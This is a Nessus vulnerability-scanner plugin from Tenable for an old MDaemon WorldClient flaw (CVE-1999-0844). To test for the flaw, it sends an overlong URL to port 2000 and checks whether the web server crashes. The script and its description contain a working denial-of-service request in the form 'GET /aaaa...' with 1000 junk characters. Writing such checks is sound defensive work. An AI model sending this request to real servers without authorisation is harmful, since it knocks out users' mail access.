#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if(description)
{
 script_id(10139);
 script_version ("$Revision: 1.26 $");

 script_cve_id("CVE-1999-0844");
 script_bugtraq_id(823);
 script_osvdb_id(12035);

 script_name(english:"MDaemon WorldClient HTTP Server URL Overflow DoS");
 script_summary(english:"Crashes the remote service");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote web server has a denial of service vulnerability."
 );
 script_set_attribute( attribute:"description",  value:
"It was possible to crash the remote WorldClient web server (which
allows users to read their mail remotely) by sending :

  GET /aaaaa[...]aaa HTTP/1.0

This issue allows a remote attacker to prevent users from reading
their email." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/1999/Nov/340"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/11/24");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/11/24");
 script_cvs_date("$Date: 2016/11/18 19:03:16 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Web Servers");

 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl");
 script_require_ports(2000);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = 2000;
if (! get_port_state(port)) exit(0, "Port "+port+" is closed");

if (http_is_dead(port:port)) exit(0, "The web server on port "+port+" is dead");
 
w  = http_send_recv3(method:"GET", port:port, item: crap(1000));
if (http_is_dead(port:port))security_warning(port);
